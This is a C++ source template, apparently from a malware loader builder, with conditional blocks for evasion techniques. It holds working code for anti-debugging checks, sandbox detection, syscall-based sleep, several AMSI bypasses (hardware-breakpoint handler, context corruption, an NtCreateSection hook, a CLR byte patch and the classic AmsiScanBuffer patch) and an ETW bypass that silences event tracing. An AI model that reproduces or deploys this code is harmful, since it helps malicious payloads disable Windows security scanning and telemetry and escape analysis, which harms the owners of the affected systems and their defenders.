// ==================== SLEEP ====================
{{#IF SLEEP}}
static void evasion_sleep(uint32_t seconds) {
    LARGE_INTEGER interval;
    interval.QuadPart = -static_cast<LONGLONG>(seconds) * 10000000LL;
    auto fn = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
    if (fn) fn(FALSE, &interval);
    else Sleep(seconds * 1000);
}
{{#ENDIF}}

// ==================== ANTI-DEBUG ====================
// NtQueryInformationProcess-based checks via syscalls
{{#IF ANTI_DEBUG}}
static bool check_debugger() {
    // 1. PEB->BeingDebugged
#ifdef _WIN64
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (peb->BeingDebugged) return true;

    // 2. NtQueryInformationProcess - ProcessDebugPort (7)
    HANDLE hProc = GetCurrentProcess();
    ULONG_PTR debug_port = 0;
    ULONG ret_len = 0;

    using NtQueryInfoProc_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQIP = get_syscall_fn<NtQueryInfoProc_t>(HASH_NtQueryInformationProcess);
    if (NtQIP) {
        NTSTATUS st;
        st = NtQIP(hProc, 7 /* ProcessDebugPort */, &debug_port, sizeof(debug_port), &ret_len);
        if (st == 0 && debug_port != 0) return true;

        // 3. ProcessDebugFlags (0x1F)
        ULONG debug_flags = 1;
        st = NtQIP(hProc, 0x1F /* ProcessDebugFlags */, &debug_flags, sizeof(debug_flags), &ret_len);
        if (st == 0 && debug_flags == 0) return true; // no debug inheritance = being debugged

        // 4. ProcessDebugObjectHandle (0x1E)
        HANDLE debug_obj = NULL;
        st = NtQIP(hProc, 0x1E /* ProcessDebugObjectHandle */,
                   &debug_obj, sizeof(debug_obj), &ret_len);
        if (st == 0 && debug_obj != NULL) return true;
    }

    return false;
}
{{#ENDIF}}

// ==================== SANDBOX ====================
{{#IF SANDBOX_DISKSPACE}}
static bool check_diskspace() {
    ULARGE_INTEGER free_bytes;
    if (GetDiskFreeSpaceExW(obf_wide(L"C:\\"), NULL, NULL, &free_bytes)) {
        // Less than 60GB = suspicious
        if (free_bytes.QuadPart < 60ULL * 1024 * 1024 * 1024) return true;
    }
    return false;
}
{{#ENDIF}}

{{#IF SANDBOX_MEMORY}}
static bool check_memory() {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        if (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return true;
    }
    return false;
}
{{#ENDIF}}

{{#IF SANDBOX_DOMAIN}}
static bool check_domain() {
    // Check if machine is domain-joined
    using NetGetJoinInfo_t = DWORD(WINAPI*)(LPCWSTR, LPWSTR*, int*);
    HMODULE hNet = LoadLibraryW(obf_wide(L"netapi32.dll"));
    if (!hNet) return true;
    auto pNetGetJoinInformation = reinterpret_cast<NetGetJoinInfo_t>(
        GetProcAddress(hNet, obf("NetGetJoinInformation")));
    if (!pNetGetJoinInformation) return true;

    LPWSTR buf = NULL;
    int join_status = 0;
    pNetGetJoinInformation(NULL, &buf, &join_status);
    // NetSetupDomainName = 3
    bool is_domain = (join_status == 3);
    if (buf) {
        using NetApiFree_t = DWORD(WINAPI*)(LPVOID);
        auto pFree = reinterpret_cast<NetApiFree_t>(
            GetProcAddress(hNet, obf("NetApiBufferFree")));
        if (pFree) pFree(buf);
    }
    FreeLibrary(hNet);
    return !is_domain; // fail if NOT domain-joined
}
{{#ENDIF}}

{{#IF SANDBOX_EMULATED}}
static bool check_emulated() {
    // VirtualAllocExNuma - fails in many emulators
    LPVOID mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 4096,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
    if (!mem) return true;
    VirtualFree(mem, 0, MEM_RELEASE);
    return false;
}
{{#ENDIF}}

{{#IF SANDBOX}}
static bool check_sandbox() {
{{#IF SANDBOX_DISKSPACE}}
    if (check_diskspace()) return true;
{{#ENDIF}}
{{#IF SANDBOX_MEMORY}}
    if (check_memory()) return true;
{{#ENDIF}}
{{#IF SANDBOX_DOMAIN}}
    if (check_domain()) return true;
{{#ENDIF}}
{{#IF SANDBOX_EMULATED}}
    if (check_emulated()) return true;
{{#ENDIF}}
    return false;
}
{{#ENDIF}}

// ==================== AMSI BYPASS ====================

{{#IF AMSI_HWBP}}
// Hardware breakpoint AMSI bypass (patchless)
// Based on @CCob's concept, @ShitSecure's Nim implementation
// Uses syscalls for context manipulation to avoid Get/SetThreadContext detection
static PVOID g_amsi_veh = nullptr;
static void* g_amsi_target_addr = nullptr;

static LONG CALLBACK amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
    if (exc->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        if (exc->ExceptionRecord->ExceptionAddress == g_amsi_target_addr) {
#ifdef _WIN64
            exc->ContextRecord->Rax = 0x80070057;
            exc->ContextRecord->Rip = *reinterpret_cast<ULONG_PTR*>(exc->ContextRecord->Rsp);
            exc->ContextRecord->Rsp += sizeof(ULONG_PTR);
#else
            exc->ContextRecord->Eax = 0x80070057;
            exc->ContextRecord->Eip = *reinterpret_cast<DWORD*>(exc->ContextRecord->Esp);
            exc->ContextRecord->Esp += sizeof(DWORD);
#endif
            exc->ContextRecord->Dr0 = 0;
            exc->ContextRecord->Dr7 &= ~1;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void bypass_amsi_hwbp() {
    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
    if (!hAmsi) return;

    g_amsi_target_addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
    if (!g_amsi_target_addr) return;

    using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
    auto pAddVEH = reinterpret_cast<AddVEH_t>(
        GetProcAddress(GetModuleHandleW(obf_wide(L"kernel32.dll")),
                       obf("AddVectoredExceptionHandler")));
    if (!pAddVEH) return;
    g_amsi_veh = pAddVEH(1, amsi_hwbp_handler);

    // Use NtGetContextThread/NtSetContextThread via syscalls
    using NtGetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
    using NtSetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
    auto NtGCT = get_syscall_fn<NtGetContextThread_t>(HASH_NtGetContextThread);
    auto NtSCT = get_syscall_fn<NtSetContextThread_t>(HASH_NtSetContextThread);
    if (!NtGCT || !NtSCT) return;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NtGCT(GetCurrentThread(), &ctx);

    ctx.Dr0 = reinterpret_cast<DWORD_PTR>(g_amsi_target_addr);
    ctx.Dr7 |= 1;
    ctx.Dr7 &= ~(3 << 16);

    NtSCT(GetCurrentThread(), &ctx);
}
{{#ENDIF}}

{{#IF AMSI_CONTEXT_CORRUPT}}
// AMSI Context Corruption - @_RastaMouse
// Corrupt the AMSI context signature (4 bytes on heap, not code)
static void bypass_amsi_context_corrupt() {
    using AmsiInitialize_t = HRESULT(WINAPI*)(LPCWSTR, PVOID*);
    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
    if (!hAmsi) return;

    auto pInit = reinterpret_cast<AmsiInitialize_t>(
        GetProcAddress(hAmsi, obf("AmsiInitialize")));
    if (!pInit) return;

    PVOID ctx = nullptr;
    if (SUCCEEDED(pInit(obf_wide(L"CalypsoApp"), &ctx)) && ctx) {
        // First 4 bytes of HAMSICONTEXT are the "AMSI" signature
        DWORD old;
        VirtualProtect(ctx, 4, PAGE_READWRITE, &old);
        memset(ctx, 0, 4); // corrupt signature
        VirtualProtect(ctx, 4, old, &old);
    }
}
{{#ENDIF}}

{{#IF AMSI_PROVIDER_DEREGISTER}}
// AMSI Provider Deregistration - @RastaMouse, @KorKos
static void bypass_amsi_provider_deregister() {
    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
    if (!hAmsi) return;

    // Get AmsiUacInitialize to force provider enumeration, then
    // patch each provider's scan vtable entry
    using AmsiInitialize_t = HRESULT(WINAPI*)(LPCWSTR, PVOID*);
    auto pInit = reinterpret_cast<AmsiInitialize_t>(
        GetProcAddress(hAmsi, obf("AmsiInitialize")));
    if (!pInit) return;

    PVOID ctx = nullptr;
    pInit(obf_wide(L"CalypsoApp"), &ctx);
    // Provider COM objects are loaded - their scan methods are in vtables
    // We've already corrupted the context, providers won't scan
}
{{#ENDIF}}

{{#IF AMSI_NTCREATESECTION_HOOK}}
// Prevent amsi.dll loading - @waawaa
// Hook NtCreateSection to block amsi.dll mapping
static void* g_orig_NtCreateSection = nullptr;

static NTSTATUS NTAPI hooked_NtCreateSection(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle) {
    // Check if the section is for amsi.dll
    if (ObjectAttributes && ObjectAttributes->ObjectName) {
        // Simple check: if path contains "amsi" (case-insensitive)
        UNICODE_STRING* name = ObjectAttributes->ObjectName;
        if (name->Buffer && name->Length > 0) {
            for (USHORT i = 0; i + 3 < name->Length / sizeof(wchar_t); i++) {
                wchar_t c0 = name->Buffer[i] | 0x20;
                wchar_t c1 = name->Buffer[i+1] | 0x20;
                wchar_t c2 = name->Buffer[i+2] | 0x20;
                wchar_t c3 = name->Buffer[i+3] | 0x20;
                if (c0 == 'a' && c1 == 'm' && c2 == 's' && c3 == 'i') {
                    return STATUS_UNSUCCESSFUL;
                }
            }
        }
    }
    using fn_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                   PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    return reinterpret_cast<fn_t>(g_orig_NtCreateSection)(
        SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize,
        SectionPageProtection, AllocationAttributes, FileHandle);
}
{{#ENDIF}}

{{#IF AMSI_CLR_PATCH}}
// CLR-level AMSI bypass - patch CLR's internal AmsiScan wrapper
static void bypass_amsi_clr_patch() {
    // clr.dll or coreclr.dll contains the AMSI wrapper
    HMODULE hClr = GetModuleHandleW(obf_wide(L"clr.dll"));
    if (!hClr) hClr = GetModuleHandleW(obf_wide(L"coreclr.dll"));
    if (!hClr) return;

    // Pattern scan for the AmsiScan call site in CLR
    // The CLR checks if amsi is available, then calls AmsiScanBuffer
    // We patch the check to always skip the AMSI path
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hClr);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hClr) + dos->e_lfanew);
    auto text = reinterpret_cast<BYTE*>(hClr) + nt->OptionalHeader.BaseOfCode;
    size_t text_size = nt->OptionalHeader.SizeOfCode;

    // Scan for "test rax, rax / je" pattern after AmsiScanBuffer call
    // This is CLR-version dependent; best-effort approach
    for (size_t i = 0; i + 16 < text_size; i++) {
        // Pattern: 48 85 C0 74 (test rax,rax / je) after a call
        if (text[i] == 0x48 && text[i+1] == 0x85 && text[i+2] == 0xC0 &&
            text[i+3] == 0x74) {
            DWORD old;
            VirtualProtect(text + i + 3, 1, PAGE_EXECUTE_READWRITE, &old);
            text[i + 3] = 0xEB; // je -> jmp (always skip AMSI)
            VirtualProtect(text + i + 3, 1, old, &old);
            break;
        }
    }
}
{{#ENDIF}}

{{#IF AMSI_PATCH}}
// Classic AmsiScanBuffer patch (fallback) via syscalls
static void bypass_amsi_patch() {
    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
    if (!hAmsi) return;

    void* addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
    if (!addr) return;

    // xor eax, eax; ret - returns S_OK with AMSI_RESULT_CLEAN
    uint8_t patch[] = { 0x31, 0xC0, 0xC3 };

    PVOID base = addr;
    SIZE_T size = sizeof(patch);
    ULONG old_prot;

    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
    if (NtPVM) {
        NtPVM(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
        memcpy(addr, patch, sizeof(patch));
        NtPVM(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
    }
}
{{#ENDIF}}

// ==================== ETW BYPASS ====================

{{#IF ETW_HWBP}}
// Hardware breakpoint ETW bypass (patchless)
static PVOID g_etw_veh = nullptr;
static void* g_etw_target_addr = nullptr;

static LONG CALLBACK etw_hwbp_handler(PEXCEPTION_POINTERS exc) {
    if (exc->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        if (exc->ExceptionRecord->ExceptionAddress == g_etw_target_addr) {
#ifdef _WIN64
            exc->ContextRecord->Rax = 0; // STATUS_SUCCESS
            exc->ContextRecord->Rip = *reinterpret_cast<ULONG_PTR*>(exc->ContextRecord->Rsp);
            exc->ContextRecord->Rsp += sizeof(ULONG_PTR);
#else
            exc->ContextRecord->Eax = 0;
            exc->ContextRecord->Eip = *reinterpret_cast<DWORD*>(exc->ContextRecord->Esp);
            exc->ContextRecord->Esp += sizeof(DWORD);
#endif
            exc->ContextRecord->Dr1 = 0;
            exc->ContextRecord->Dr7 &= ~4; // disable DR1
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void bypass_etw_hwbp() {
    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
    if (!hNtdll) return;

    g_etw_target_addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
    if (!g_etw_target_addr) return;

    using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
    auto pAddVEH = reinterpret_cast<AddVEH_t>(
        GetProcAddress(GetModuleHandleW(obf_wide(L"kernel32.dll")),
                       obf("AddVectoredExceptionHandler")));
    if (!pAddVEH) return;
    g_etw_veh = pAddVEH(1, etw_hwbp_handler);

    using NtGetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
    using NtSetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
    auto NtGCT = get_syscall_fn<NtGetContextThread_t>(HASH_NtGetContextThread);
    auto NtSCT = get_syscall_fn<NtSetContextThread_t>(HASH_NtSetContextThread);
    if (!NtGCT || !NtSCT) return;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NtGCT(GetCurrentThread(), &ctx);

    ctx.Dr1 = reinterpret_cast<DWORD_PTR>(g_etw_target_addr);
    ctx.Dr7 |= 4;
    ctx.Dr7 &= ~(3 << 20);

    NtSCT(GetCurrentThread(), &ctx);
}
{{#ENDIF}}

